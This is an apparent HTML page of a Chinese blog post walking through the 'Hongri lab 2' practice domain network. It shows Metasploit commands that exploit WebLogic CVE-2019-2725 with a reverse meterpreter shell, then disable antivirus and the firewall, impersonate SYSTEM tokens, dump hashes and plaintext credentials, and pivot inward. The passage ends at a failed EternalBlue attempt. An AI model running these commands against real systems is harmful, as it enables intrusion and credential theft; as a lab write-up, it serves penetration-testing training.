@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="WebLogic wls9-async 组件命令执行漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场2">
+<meta property="og:url" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="WebLogic wls9-async 组件命令执行漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/1.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802113234358.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802165927302.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170036075.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170614526.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170941170.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802172352743.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802172711365.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802171336747.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802174544968.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175140210.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175801277.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175932605.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803183657415.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803203604217.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803184254276.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105027645.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803193113909.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105257213.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105602146.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803112728035.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185847537.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803112753809.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190059469.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190254536.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190634472.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190724304.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185018605.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185330714.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803115943337.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185443908.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803120318190.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803125157642.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803134559161.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803194339654.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803140752989.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803140910385.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803195135476.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803195918584.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803200249965.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803200338831.png">
+<meta property="article:published_time" content="2024-08-02T03:17:47.000Z">
+<meta property="article:modified_time" content="2024-08-03T12:36:48.251Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/1.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红日靶场2 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-08-02 11:17:47" itemprop="dateCreated datePublished" datetime="2024-08-02T11:17:47+08:00">2024-08-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-08-03 20:36:48" itemprop="dateModified" datetime="2024-08-03T20:36:48+08:00">2024-08-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2.html" class="post-meta-item leancloud_visitors" data-flag-title="红日靶场2" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>WebLogic wls9-async 组件命令执行漏洞</p>
+<span id="more"></span>
+
+<h1 id="红日靶场2"><a href="#红日靶场2" class="headerlink" title="红日靶场2"></a>红日靶场2</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>环境下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+</blockquote>
+<h3 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h3><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/1.png"></p>
+<h3 id="配置网段"><a href="#配置网段" class="headerlink" title="配置网段"></a>配置网段</h3><p>打开vm找到左上角<code>编辑—&gt;虚拟网络编辑器</code>添加一段虚拟网络VMnet7，设置为仅主机s</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802113234358.png"></p>
+<h3 id="配置DC域控"><a href="#配置DC域控" class="headerlink" title="配置DC域控"></a>配置DC域控</h3><p>点击<code>.vmx</code>文件加载虚拟机配置，然后点击<code>升级此虚拟机</code>将兼容性改成16.2</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802165927302.png"></p>
+<p>点击<code>更改此虚拟机</code>即可</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170036075.png"></p>
+<p>剩下两台机子都需要进行上述操作就不再赘述</p>
+<p>修改网络适配器为<code>VMnet7</code>网卡</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170614526.png"></p>
+<h3 id="配置PC"><a href="#配置PC" class="headerlink" title="配置PC"></a>配置PC</h3><p>PC机相当于网关服务器，所以需要两张网卡，一个用来向外网提供web服务，一个是通向内网</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170941170.png"></p>
+<p>由于作者设置的NET网段是<code>192.168.111.0/24</code>，而我们的NET网卡是<code>192.168.132.0/24</code>，所以需要修改一下</p>
+<p>我们使用密码<code>1qaz@WSX</code>登录PC机，打开<code>控制面板 =&gt; 网络和 Internet =&gt; 网络和共享中心</code>。点击左侧更改网络适配器，选择本地连接使用<code>administrator:1qaz@WSX</code>查看属性，修改下ip地址以及默认网关即可</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802172352743.png"></p>
+<p>查看下ipconfig，修改成功</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802172711365.png"></p>
+<h3 id="配置WEB"><a href="#配置WEB" class="headerlink" title="配置WEB"></a>配置WEB</h3><p>需要两块网卡，相当于网关服务器</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802171336747.png"></p>
+<p>和PC机一样，我们也需要登录修改下网络适配器，不过这里需要将快照先回退到V1.3的时候</p>
+<p>使用<code>1qaz@WSX</code>登录后和配置PC机一样的步骤，修改ip地址和默认网关</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802174544968.png"></p>
+<p>查看ipconfig，修改成功</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175140210.png"></p>
+<p>然后开启下web服务，访问<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code></p>
+<p>遇到无权限访问就使用<code>administrator:1qaz@WSX</code>登录，然后以管理员权限执行<code>startWebLogic</code>文件</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175801277.png"></p>
+<p>启动服务成功</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175932605.png"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用fscan扫描下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.132.80 -no</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803183657415.png"></p>
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>可以发现7001端口扫出来有weblogic中间件的<code>CVE-2019-2725</code>，这里试了半天</p>
+<blockquote>
+<p>注：由于是java反序列化的漏洞，所以网上不同exp对应的jdk版本可能不同，在使用时需要注意下</p>
+</blockquote>
+<p>我们打开metasploit搜索一下<code>cve-2019-2725</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803203604217.png"></p>
+<p>依次执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set RHOSTS 192.168.132.80</span><br><span class="line">set LHOST 192.168.132.133</span><br><span class="line">set target 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到meterpreter会话</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803184254276.png"></p>
+<p>执行shell命令，输入<code>chcp 65001</code>解决中文乱码问题</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105027645.png"></p>
+<p>养成好习惯，上线msf第一件事在meterpreter会话中关闭杀毒软件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run killav</span><br></pre></td></tr></table></figure>
+
+<p>还有关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803193113909.png"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试窃取SYSTEM权限令牌，在meterpreter会话依次执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load incognito                                   #加载incognito模块</span><br><span class="line">list_tokens -u                                   #列出主机上所有令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;          #窃取NT AUTHORITY\SYSTEM账户的令牌</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105257213.png"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h3><h4 id="查看网络适配器"><a href="#查看网络适配器" class="headerlink" title="查看网络适配器"></a>查看网络适配器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+
+<p>可以知道还存在<code>10.10.10.0/24</code>内网网段</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105602146.png"></p>
+<h4 id="查看本地用户信息"><a href="#查看本地用户信息" class="headerlink" title="查看本地用户信息"></a>查看本地用户信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+
+<p>存在三个用户</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803112728035.png"></p>
+<h4 id="查看本地管理员组"><a href="#查看本地管理员组" class="headerlink" title="查看本地管理员组"></a>查看本地管理员组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185847537.png"></p>
+<h3 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h3><h4 id="查看是否存在域环境"><a href="#查看是否存在域环境" class="headerlink" title="查看是否存在域环境"></a>查看是否存在域环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config Workstation   </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>坑点：在没有提权前是可以执行找到名为<code>DE1AY</code>的域环境，但是后面提升到SYSTEM权限执行不了此命令</p>
+</blockquote>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803112753809.png"></p>
+<h4 id="查看域用户信息"><a href="#查看域用户信息" class="headerlink" title="查看域用户信息"></a>查看域用户信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190059469.png"></p>
+<h4 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /Domain</span><br></pre></td></tr></table></figure>
+
+<p>查看域管理员组，得到管理员用户为<code>Administrator</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190254536.png"></p>
+<h4 id="查看主域控制器"><a href="#查看主域控制器" class="headerlink" title="查看主域控制器"></a>查看主域控制器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190634472.png"></p>
+<h4 id="定位主域控制器"><a href="#定位主域控制器" class="headerlink" title="定位主域控制器"></a>定位主域控制器</h4><p>拿到主域控制器名称后，执行以下命令定位目标主机在内网的IP为<code>10.10.10.10</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping DC.de1ay.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190724304.png"></p>
+<h3 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h3><p>由于我们拿到shell了，利用后渗透阶段的基于arp协议探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185018605.png"></p>
+<p>发现存活主机<code>10.10.10.10</code>和<code>10.10.10.201</code></p>
+<h3 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h3><h4 id="抓取Hash"><a href="#抓取Hash" class="headerlink" title="抓取Hash"></a>抓取Hash</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185330714.png"></p>
+<h4 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h4><p>我们先将进程迁移到64位程序中，比如PID为516的lsass.exe进程</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803115943337.png"></p>
+<p>使用msf中的kiwi模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi         #加载kiwi模块</span><br><span class="line">creds_all         #抓取所有明文密码</span><br></pre></td></tr></table></figure>
+
+<p>抓取到明文密码</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185443908.png"></p>
+<h3 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h3><p>我们前面知道还存在<code>10.10.10.0/24</code>网段，借助MSF 的 autoroute 模块获取当前机器的所有网段信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803120318190.png"></p>
+<p>尝试探测<code>10.10.10.201</code>的445端口是否开放</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set RHOSTS 10.10.10.201</span><br><span class="line">set THREADS 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803125157642.png"></p>
+<p>开启445端口的话，尝试使用永恒之蓝漏洞，利用失败</p>
